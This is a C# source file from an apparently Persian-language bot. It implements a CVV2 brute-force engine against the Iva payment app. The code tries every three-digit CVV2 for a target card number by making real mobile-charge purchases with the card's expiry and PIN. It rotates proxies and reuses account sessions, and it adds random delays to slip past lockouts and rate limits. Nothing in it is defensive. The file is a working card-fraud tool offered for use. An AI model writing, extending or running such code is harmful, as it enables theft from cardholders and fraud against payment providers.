// language: C#, file: BruteEngine.cs
using System.Diagnostics;
using System.Security.Cryptography;
using Iva.Auth;

namespace Iva.Bot;

public sealed class BruteResult
{
    public bool Found { get; set; }
    public string? Cvv2 { get; set; }
    public int Attempts { get; set; }
    public int Errors { get; set; }
    public TimeSpan Elapsed { get; set; }
    public string? Reason { get; set; }
}

public sealed class BruteEngine
{
    private readonly BruteConfig _cfg;
    private readonly ProxyPool _pool;
    private readonly Action<string> _onProgress;
    private readonly StreamWriter _log;
    private readonly object _logLock = new();

    public bool IsRunning { get; private set; }

    public BruteEngine(BruteConfig cfg, ProxyPool pool, Action<string> onProgress)
    {
        _cfg = cfg;
        _pool = pool;
        _onProgress = onProgress;
        _log = new StreamWriter(cfg.LogPath, append: true) { AutoFlush = true };
    }

    public async Task<BruteResult> RunAsync(CancellationToken ct)
    {
        IsRunning = true;
        var sw = Stopwatch.StartNew();
        var candidates = BuildCandidates();
        var attempts = 0;
        var consecutiveErrors = 0;
        string? foundCvv = null;
        string? stopReason = null;
        var lastReport = 0;

        Log($"[START] pan={Mask(_cfg.TargetPan)} | candidates={candidates.Count} | proxies={_pool.Count}");

        try
        {
            foreach (var cvv in candidates)
            {
                if (ct.IsCancellationRequested) { stopReason = "cancelled"; break; }
                if (attempts >= _cfg.MaxTotalAttempts) { stopReason = "max-attempts"; break; }
                if (consecutiveErrors >= _cfg.MaxConsecutiveErrors)
                {
                    stopReason = "consecutive-errors";
                    Log($"[STOP] {_cfg.MaxConsecutiveErrors} خطای پشت‌سرهم.");
                    break;
                }

                var proxy = _pool.Next();
                if (proxy is null)
                {
                    _onProgress("⏳ pool خالیه، ۳۰ ثانیه صبر...");
                    await Task.Delay(30000, ct);
                    continue;
                }

                try
                {
                    var (success, message) = await TryCvvAsync(cvv, proxy, ct);
                    attempts++;

                    if (success)
                    {
                        foundCvv = cvv;
                        Log($"[FOUND] ✓ cvv={cvv} | attempts={attempts}");
                        _onProgress($"🎯 پیدا شد! CVV2 = `{cvv}`\nتعداد تلاش: {attempts}");
                        break;
                    }

                    if (IsLocked(message))
                    {
                        stopReason = "card-locked";
                        Log($"[STOP] کارت قفل شد: {message}");
                        _onProgress($"🔒 کارت قفل شد\nپیام: {message}\nتعداد تلاش: {attempts}");
                        break;
                    }

                    if (IsRetryable(message))
                    {
                        consecutiveErrors++;
                        _pool.MarkDead(proxy);
                        Log($"[RETRY] cvv={cvv} | msg={message} | consec={consecutiveErrors}");
                    }
                    else
                    {
                        consecutiveErrors = 0;
                        _pool.MarkAlive(proxy);
                        Log($"[MISS] cvv={cvv} | msg={message}");
                    }
                }
                catch (Exception ex)
                {
                    attempts++;
                    consecutiveErrors++;
                    _pool.MarkDead(proxy);
                    Log($"[EXC] cvv={cvv} | {ex.Message}");
                }

                // گزارش وضعیت هر ۱۰ تلاش
                if (attempts - lastReport >= 10)
                {
                    lastReport = attempts;
                    var rate = attempts / Math.Max(1, sw.Elapsed.TotalSeconds);
                    _onProgress($"📊 {attempts} تلاش | {consecutiveErrors} خطا | {rate:F2} req/s | {_pool.Count} proxy");
                }

                var delay = RandomNumberGenerator.GetInt32(_cfg.DelayMinMs, _cfg.DelayMaxMs + 1);
                await Task.Delay(delay, ct);
            }
        }
        finally
        {
            IsRunning = false;
            sw.Stop();
            Log($"[DONE] found={foundCvv ?? "no"} | attempts={attempts} | reason={stopReason ?? "exhausted"}");
        }

        return new BruteResult
        {
            Found = foundCvv is not null,
            Cvv2 = foundCvv,
            Attempts = attempts,
            Errors = consecutiveErrors,
            Elapsed = sw.Elapsed,
            Reason = stopReason,
        };
    }

    private async Task<(bool Success, string? Message)> TryCvvAsync(string cvv, ValidatedProxy proxy, CancellationToken ct)
    {
        var options = new IvaOptions
        {
            Timeout = TimeSpan.FromSeconds(35),
            MaxChargeRetries = 0,
            ChargeProxy = proxy.ToLine(),
        };

        using var client = new IvaAuthClient(options, sessions: new FileSessionRepository(_cfg.SessionsDir));

        var sessionRepo = new FileSessionRepository(_cfg.SessionsDir);
        var phones = sessionRepo.ListPhones();
        if (phones.Count == 0) throw new InvalidOperationException("هیچ سشن آیوا موجود نیست.");

        var chosen = phones[RandomNumberGenerator.GetInt32(phones.Count)];
        client.TryResumeSession(chosen);

        await client.EnsureSecureChannelAsync(ct);
        await client.RefreshAuthAsync(ct);

        var result = await client.BuyChargeAsync(
            new ChargePurchaseRequest
            {
                Amount = _cfg.TestAmount,
                TargetMobileNo = _cfg.TargetMobileNo,
                ProviderId = _cfg.ProviderId,
                Card = new CardPayment
                {
                    Pan = _cfg.TargetPan,
                    Cvv2 = cvv,
                    ExpireMonth = _cfg.ExpireMonth,
                    ExpireYear = _cfg.ExpireYear,
                    Pin = _cfg.Pin,
                }
            }, ct, useProxy: true);

        return (result.Success, result.Message);
    }

    private List<string> BuildCandidates()
    {
        var list = Enumerable.Range(0, 1000).Select(i => i.ToString("D3")).ToList();
        for (int i = list.Count - 1; i > 0; i--)
        {
            var j = RandomNumberGenerator.GetInt32(i + 1);
            (list[i], list[j]) = (list[j], list[i]);
        }
        return list;
    }

    private static bool IsLocked(string? msg)
    {
        if (string.IsNullOrEmpty(msg)) return false;
        string[] keys = { "قفل", "مسدود", "بلاک", "too many", "تعداد تلاش" };
        return keys.Any(k => msg.Contains(k, StringComparison.OrdinalIgnoreCase));
    }

    private static bool IsRetryable(string? msg)
    {
        if (string.IsNullOrEmpty(msg)) return true;
        string[] keys = { "ناموفق", "خطا", "شکست", "incorrect", "invalid", "failed" };
        return keys.Any(k => msg.Contains(k, StringComparison.OrdinalIgnoreCase));
    }

    private static string Mask(string pan) =>
        pan.Length >= 16 ? pan[..6] + "******" + pan[^4..] : pan;

    private void Log(string line)
    {
        lock (_logLock) _log.WriteLine(line);
    }
}